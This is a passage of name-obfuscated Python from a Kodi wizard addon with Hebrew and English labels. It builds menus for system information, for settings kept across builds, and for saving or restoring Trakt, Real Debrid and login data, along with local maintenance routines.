	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O0O00OOO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2687
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO000O00O0OOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2688
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2690
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00O0OO0O0O0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2691
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OOO00OO00OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2692
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0OOO00O0O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2693
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO0OO00OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2694
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00O0OO0O0O0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2695
	O000OOOO00OOOO00O =len (O00O00000O0O00O00 )+len (O000OOOOO0O0OOOOO )+len (OOOOOOO00O00O0O00 )+len (OOO0OOOOO0O0O0OOO )+len (O0OOOOO0O00OOOOO0 )+len (OOO0OO0000OOOOOO0 )+len (OOO00O0O00000000O )#line:2697
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O000OOOO00OOOO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2698
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOOO00O00O0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2699
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OOOOO0O0O0OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2700
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000OOOOO0O0OOOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2701
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O00000O0O00O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2702
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO00O0O00000000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2703
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OO0000OOOOOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2704
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOOO0O00OOOOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2705
def Menu ():#line:2706
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2707
def saveMenu ():#line:2709
	O0O0O0OO00O0OOOOO ='[COLOR yellow]מופעל[/COLOR]';OOO00O0O000O0OOO0 ='[COLOR blue]מבוטל[/COLOR]'#line:2711
	O00OOO0O000OOOO00 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2712
	OOOOO00OOOOO0OO00 ='true'if KEEPMOVIELIST =='true'else 'false'#line:2713
	O0O0O000O000O0O00 ='true'if KEEPINFO =='true'else 'false'#line:2714
	O00OO00000OO0O0OO ='true'if KEEPSOUND =='true'else 'false'#line:2716
	OO0OO00O000000OOO ='true'if KEEPVIEW =='true'else 'false'#line:2717
	OOO0OOO00000O0O00 ='true'if KEEPSKIN =='true'else 'false'#line:2718
	O0O0000O0O000OOO0 ='true'if KEEPSKIN2 =='true'else 'false'#line:2719
	OO000O0OO00O0O00O ='true'if KEEPSKIN3 =='true'else 'false'#line:2720
	O0O00O00OO00OOO0O ='true'if KEEPADDONS =='true'else 'false'#line:2721
	O0OO0OO0OOOO0OO00 ='true'if KEEPPVR =='true'else 'false'#line:2722
	OO0OO0OOOOOO00OOO ='true'if KEEPTVLIST =='true'else 'false'#line:2723
	O0O00O00OOO00OO0O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2724
	OOO0OO000OO00O0O0 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2725
	OOO00OO000000OOO0 ='true'if KEEPHUBTV =='true'else 'false'#line:2726
	O0OOOO0O000O0OO0O ='true'if KEEPHUBVOD =='true'else 'false'#line:2727
	OO00OO0OOOOO0OOOO ='true'if KEEPHUBSPORT =='true'else 'false'#line:2728
	OOOOOO00OO000O0OO ='true'if KEEPHUBKIDS =='true'else 'false'#line:2729
	O0OO00OOO00OOO000 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2730
	O00OO0O00O0O00O0O ='true'if KEEPHUBMENU =='true'else 'false'#line:2731
	O0O000000O0OOO0OO ='true'if KEEPPLAYLIST =='true'else 'false'#line:2732
	O0O0OO0000O00O0O0 ='true'if KEEPTRAKT =='true'else 'false'#line:2733
	O00O000O0OOOO00O0 ='true'if KEEPREAL =='true'else 'false'#line:2734
	OOO0OO00O0O00000O ='true'if KEEPRD2 =='true'else 'false'#line:2735
	O00O00OOO00O0O00O ='true'if KEEPTORNET =='true'else 'true'#line:2736
	O0O0O0000OOO00000 ='true'if KEEPLOGIN =='true'else 'false'#line:2737
	O0O0000OO0OOO0O0O ='true'if KEEPSOURCES =='true'else 'false'#line:2738
	O00OO0OOO0000O0OO ='true'if KEEPADVANCED =='true'else 'false'#line:2739
	OOOOOOO00O0O0OOOO ='true'if KEEPPROFILES =='true'else 'false'#line:2740
	OOOOO0O00OOOOO00O ='true'if KEEPFAVS =='true'else 'false'#line:2741
	OO0OO000000OO00O0 ='true'if KEEPREPOS =='true'else 'false'#line:2742
	O0O00O000O0O00O0O ='true'if KEEPSUPER =='true'else 'false'#line:2743
	O0OOO000OOO0O00OO ='true'if KEEPWHITELIST =='true'else 'false'#line:2744
	OO0OO0OOO0O000OOO ='true'if KEEPWEATHER =='true'else 'false'#line:2745
	O0OOOOOO00O000000 ='true'if KEEPVICTORY =='true'else 'false'#line:2746
	O00O0O00OO00000O0 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:2747
	if O0OOO000OOO0O00OO =='true':#line:2749
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2750
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2751
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2752
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2753
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2754
	addFile ('%s שמירת חשבון RD:  '%O00O000O0OOOO00O0 .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2757
	addFile ('%s שמירת חשבון טראקט:  '%O0O0OO0000O00O0O0 .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2758
	addFile ('%s שמירת מועדפים:  '%OOOOO0O00OOOOO00O .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2761
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0OO0OO0OOOO0OO00 .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2762
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0OOOOOO00O000000 .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:2763
	addFile ('%s שמירת חשבון טלמדיה:  '%O00O0O00OO00000O0 .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:2764
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OO0OO0OOOOOO00OOO .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2765
	addFile ('%s שמירת אריח סרטים:  '%O0O00O00OOO00OO0O .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2766
	addFile ('%s שמירת אריח סדרות:  '%OOO0OO000OO00O0O0 .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2767
	addFile ('%s שמירת אריח טלויזיה:  '%OOO00OO000000OOO0 .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2768
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O0OOOO0O000O0OO0O .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2769
	addFile ('%s שמירת אריח ספורט:  '%OO00OO0OOOOO0OOOO .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2770
	addFile ('%s שמירת אריח ילדים:  '%OOOOOO00OO000O0OO .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2771
	addFile ('%s שמירת אריח מוסיקה:  '%O0OO00OOO00OOO000 .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2772
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O00OO0O00O0O00O0O .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2773
	addFile ('%s שמירת כל האריחים בסקין:  '%OOO0OOO00000O0O00 .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2774
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OO0OO0OOO0O000OOO .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:2775
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O0O00O00OO00OOO0O .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2781
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O0O0O000O000O0O00 .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2782
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOOOO00OOOOO0OO00 .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2785
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O0O0000OO0OOO0O0O .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2786
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O00OO00000OO0O0OO .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2787
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO0OO00O000000OOO .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2789
	addFile ('%s שמירת פליליסט לאודר:  '%O0O000000O0OOO0OO .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2790
	addFile ('%s שמירת הגדרות באפר: '%O00OO0OOO0000O0OO .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2795
	addFile ('%s שמירת רשימות ריפו:  '%OO0OO000000OO00O0 .replace ('true',O0O0O0OO00O0OOOOO ).replace ('false',OOO00O0O000O0OOO0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2797
	setView ('files','viewType')#line:2799
def traktMenu ():#line:2801
	O0OOO00OOOOO00OO0 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2802
	O0O0O00O0000000O0 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2803
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2804
	addFile ('Save Trakt Data: %s'%O0OOO00OOOOO00OO0 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2805
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0O0O00O0000000O0 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2806
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2807
	for O0OOO00OOOOO00OO0 in traktit .ORDER :#line:2809
		O0OOO000000O0O0O0 =TRAKTID [O0OOO00OOOOO00OO0 ]['name']#line:2810
		O0O0000OO0000O0O0 =TRAKTID [O0OOO00OOOOO00OO0 ]['path']#line:2811
		O00O0OOO0OO0O0O0O =TRAKTID [O0OOO00OOOOO00OO0 ]['saved']#line:2812
		OOOOOOOO0O000OOOO =TRAKTID [O0OOO00OOOOO00OO0 ]['file']#line:2813
		OOO0O0OO000OO000O =wiz .getS (O00O0OOO0OO0O0O0O )#line:2814
		OO0OOO000OOO0OOO0 =traktit .traktUser (O0OOO00OOOOO00OO0 )#line:2815
		O0OOOOO000OOO0000 =TRAKTID [O0OOO00OOOOO00OO0 ]['icon']if os .path .exists (O0O0000OO0000O0O0 )else ICONTRAKT #line:2816
		OO0000OOOOO0O00OO =TRAKTID [O0OOO00OOOOO00OO0 ]['fanart']if os .path .exists (O0O0000OO0000O0O0 )else FANART #line:2817
		O0000O000O00O000O =createMenu ('saveaddon','Trakt',O0OOO00OOOOO00OO0 )#line:2818
		O00000OO0OO0O0OOO =createMenu ('save','Trakt',O0OOO00OOOOO00OO0 )#line:2819
		O0000O000O00O000O .append ((THEME2 %'%s Settings'%O0OOO000000O0O0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0OOO00OOOOO00OO0 )))#line:2820
		addFile ('[+]-> %s'%O0OOO000000O0O0O0 ,'',icon =O0OOOOO000OOO0000 ,fanart =OO0000OOOOO0O00OO ,themeit =THEME3 )#line:2822
		if not os .path .exists (O0O0000OO0000O0O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OOOOO000OOO0000 ,fanart =OO0000OOOOO0O00OO ,menu =O0000O000O00O000O )#line:2823
		elif not OO0OOO000OOO0OOO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0OOO00OOOOO00OO0 ,icon =O0OOOOO000OOO0000 ,fanart =OO0000OOOOO0O00OO ,menu =O0000O000O00O000O )#line:2824
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OOO000OOO0OOO0 ,'authtrakt',O0OOO00OOOOO00OO0 ,icon =O0OOOOO000OOO0000 ,fanart =OO0000OOOOO0O00OO ,menu =O0000O000O00O000O )#line:2825
		if OOO0O0OO000OO000O =="":#line:2826
			if os .path .exists (OOOOOOOO0O000OOOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0OOO00OOOOO00OO0 ,icon =O0OOOOO000OOO0000 ,fanart =OO0000OOOOO0O00OO ,menu =O00000OO0OO0O0OOO )#line:2827
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0OOO00OOOOO00OO0 ,icon =O0OOOOO000OOO0000 ,fanart =OO0000OOOOO0O00OO ,menu =O00000OO0OO0O0OOO )#line:2828
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO0O0OO000OO000O ,'',icon =O0OOOOO000OOO0000 ,fanart =OO0000OOOOO0O00OO ,menu =O00000OO0OO0O0OOO )#line:2829
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2831
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2832
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2833
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2834
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2835
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2836
	setView ('files','viewType')#line:2837
def realMenu ():#line:2839
	OOOO0OO0OOOO000OO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2840
	OOOOOO00O00OOO0O0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2841
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2842
	addFile ('Save Real Debrid Data: %s'%OOOO0OO0OOOO000OO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2843
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OOOOOO00O00OOO0O0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:2844
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2845
	for OO0O00O0O0O00000O in debridit .ORDER :#line:2847
		OOOO0O0O00OO0O00O =DEBRIDID [OO0O00O0O0O00000O ]['name']#line:2848
		OO00OOO0OOOO0O000 =DEBRIDID [OO0O00O0O0O00000O ]['path']#line:2849
		OOO0OO0OOO00OO0O0 =DEBRIDID [OO0O00O0O0O00000O ]['saved']#line:2850
		O000000OOO00O0O00 =DEBRIDID [OO0O00O0O0O00000O ]['file']#line:2851
		OO0O0OO00O00OO00O =wiz .getS (OOO0OO0OOO00OO0O0 )#line:2852
		OO0OOOOOOO00OO0O0 =debridit .debridUser (OO0O00O0O0O00000O )#line:2853
		OOOOOO00O0O0O0000 =DEBRIDID [OO0O00O0O0O00000O ]['icon']if os .path .exists (OO00OOO0OOOO0O000 )else ICONREAL #line:2854
		O000O0000OOOO0O00 =DEBRIDID [OO0O00O0O0O00000O ]['fanart']if os .path .exists (OO00OOO0OOOO0O000 )else FANART #line:2855
		OOOOOOO00OOO0OOOO =createMenu ('saveaddon','Debrid',OO0O00O0O0O00000O )#line:2856
		OOO0OO0O00O000OO0 =createMenu ('save','Debrid',OO0O00O0O0O00000O )#line:2857
		OOOOOOO00OOO0OOOO .append ((THEME2 %'%s Settings'%OOOO0O0O00OO0O00O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OO0O00O0O0O00000O )))#line:2858
		addFile ('[+]-> %s'%OOOO0O0O00OO0O00O ,'',icon =OOOOOO00O0O0O0000 ,fanart =O000O0000OOOO0O00 ,themeit =THEME3 )#line:2860
		if not os .path .exists (OO00OOO0OOOO0O000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOOOO00O0O0O0000 ,fanart =O000O0000OOOO0O00 ,menu =OOOOOOO00OOO0OOOO )#line:2861
		elif not OO0OOOOOOO00OO0O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OO0O00O0O0O00000O ,icon =OOOOOO00O0O0O0000 ,fanart =O000O0000OOOO0O00 ,menu =OOOOOOO00OOO0OOOO )#line:2862
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OOOOOOO00OO0O0 ,'authdebrid',OO0O00O0O0O00000O ,icon =OOOOOO00O0O0O0000 ,fanart =O000O0000OOOO0O00 ,menu =OOOOOOO00OOO0OOOO )#line:2863
		if OO0O0OO00O00OO00O =="":#line:2864
			if os .path .exists (O000000OOO00O0O00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OO0O00O0O0O00000O ,icon =OOOOOO00O0O0O0000 ,fanart =O000O0000OOOO0O00 ,menu =OOO0OO0O00O000OO0 )#line:2865
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OO0O00O0O0O00000O ,icon =OOOOOO00O0O0O0000 ,fanart =O000O0000OOOO0O00 ,menu =OOO0OO0O00O000OO0 )#line:2866
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0O0OO00O00OO00O ,'',icon =OOOOOO00O0O0O0000 ,fanart =O000O0000OOOO0O00 ,menu =OOO0OO0O00O000OO0 )#line:2867
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2869
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2870
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2871
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2872
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2873
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2874
	setView ('files','viewType')#line:2875
def loginMenu ():#line:2877
	O0OO000OO0O000O0O ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:2878
	OO0O0000000OO00O0 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:2879
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:2880
	addFile ('Save Login Data: %s'%O0OO000OO0O000O0O ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:2881
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OO0O0000000OO00O0 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2882
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2883
	for O0OO000OO0O000O0O in loginit .ORDER :#line:2885
		O00OOO0OO000OO0OO =LOGINID [O0OO000OO0O000O0O ]['name']#line:2886
		O00OO00000O0OOO0O =LOGINID [O0OO000OO0O000O0O ]['path']#line:2887
		OO000OOO0OO00O000 =LOGINID [O0OO000OO0O000O0O ]['saved']#line:2888
		O00O0000OO00O000O =LOGINID [O0OO000OO0O000O0O ]['file']#line:2889
		OO0000O0OO000000O =wiz .getS (OO000OOO0OO00O000 )#line:2890
		OOO00OO0O0O00O0O0 =loginit .loginUser (O0OO000OO0O000O0O )#line:2891
		O00O00O0O0OO00000 =LOGINID [O0OO000OO0O000O0O ]['icon']if os .path .exists (O00OO00000O0OOO0O )else ICONLOGIN #line:2892
		O0O0OO00OOO0O0O0O =LOGINID [O0OO000OO0O000O0O ]['fanart']if os .path .exists (O00OO00000O0OOO0O )else FANART #line:2893
		OOOOOOO0OO00OOOO0 =createMenu ('saveaddon','Login',O0OO000OO0O000O0O )#line:2894
		O00000000OOO00000 =createMenu ('save','Login',O0OO000OO0O000O0O )#line:2895
		OOOOOOO0OO00OOOO0 .append ((THEME2 %'%s Settings'%O00OOO0OO000OO0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O0OO000OO0O000O0O )))#line:2896
		addFile ('[+]-> %s'%O00OOO0OO000OO0OO ,'',icon =O00O00O0O0OO00000 ,fanart =O0O0OO00OOO0O0O0O ,themeit =THEME3 )#line:2898
		if not os .path .exists (O00OO00000O0OOO0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00O00O0O0OO00000 ,fanart =O0O0OO00OOO0O0O0O ,menu =OOOOOOO0OO00OOOO0 )#line:2899
		elif not OOO00OO0O0O00O0O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O0OO000OO0O000O0O ,icon =O00O00O0O0OO00000 ,fanart =O0O0OO00OOO0O0O0O ,menu =OOOOOOO0OO00OOOO0 )#line:2900
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO00OO0O0O00O0O0 ,'authlogin',O0OO000OO0O000O0O ,icon =O00O00O0O0OO00000 ,fanart =O0O0OO00OOO0O0O0O ,menu =OOOOOOO0OO00OOOO0 )#line:2901
		if OO0000O0OO000000O =="":#line:2902
			if os .path .exists (O00O0000OO00O000O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O0OO000OO0O000O0O ,icon =O00O00O0O0OO00000 ,fanart =O0O0OO00OOO0O0O0O ,menu =O00000000OOO00000 )#line:2903
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O0OO000OO0O000O0O ,icon =O00O00O0O0OO00000 ,fanart =O0O0OO00OOO0O0O0O ,menu =O00000000OOO00000 )#line:2904
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0000O0OO000000O ,'',icon =O00O00O0O0OO00000 ,fanart =O0O0OO00OOO0O0O0O ,menu =O00000000OOO00000 )#line:2905
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2907
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2908
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2909
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2910
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2911
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2912
	setView ('files','viewType')#line:2913
def fixUpdate ():#line:2915
	if KODIV <17 :#line:2916
		O0O0OOO000O0OO0O0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:2917
		try :#line:2918
			os .remove (O0O0OOO000O0OO0O0 )#line:2919
		except Exception as OO0OOOOOOOOOO000O :#line:2920
			wiz .log ("Unable to remove %s, Purging DB"%O0O0OOO000O0OO0O0 )#line:2921
			wiz .purgeDb (O0O0OOO000O0OO0O0 )#line:2922
	else :#line:2923
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:2924
def removeAddonMenu ():#line:2926
	O000000O0OO000OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:2927
	O00O00000O0O0OOO0 =[];O0OO000OO0O0000O0 =[]#line:2928
	for O0O000OOOO0O00OO0 in sorted (O000000O0OO000OO0 ,key =lambda O0O0000O00000OO00 :O0O0000O00000OO00 ):#line:2929
		OOOOOO0OOOOOOO0O0 =os .path .split (O0O000OOOO0O00OO0 [:-1 ])[1 ]#line:2930
		if OOOOOO0OOOOOOO0O0 in EXCLUDES :continue #line:2931
		elif OOOOOO0OOOOOOO0O0 in DEFAULTPLUGINS :continue #line:2932
		elif OOOOOO0OOOOOOO0O0 =='packages':continue #line:2933
		OO0000OO00O00OOO0 =os .path .join (O0O000OOOO0O00OO0 ,'addon.xml')#line:2934
